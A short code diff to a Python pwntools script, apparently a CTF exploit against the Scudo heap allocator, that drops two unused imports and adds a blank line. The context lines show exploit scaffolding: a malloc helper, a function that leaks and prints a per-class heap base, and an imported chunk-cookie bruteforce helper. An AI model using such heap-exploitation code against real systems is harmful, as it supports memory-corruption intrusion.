@@ -1,7 +1,5 @@
 from pwn import *
-from z3 import *
 from scudocookie import bruteforce, calc_checksum
-from crc32c import crc32c
 
 
 def malloc(io, size, data=b""):
@@ -52,6 +50,7 @@ def get_perclass_base(io, scudo_lib, class_id=0):
     print(f'perclass base leak: {hex(perclass_base)}')
     return perclass_base + (class_id * 0x100)
 
+    
 def get_libc_base(io):
     pass
 
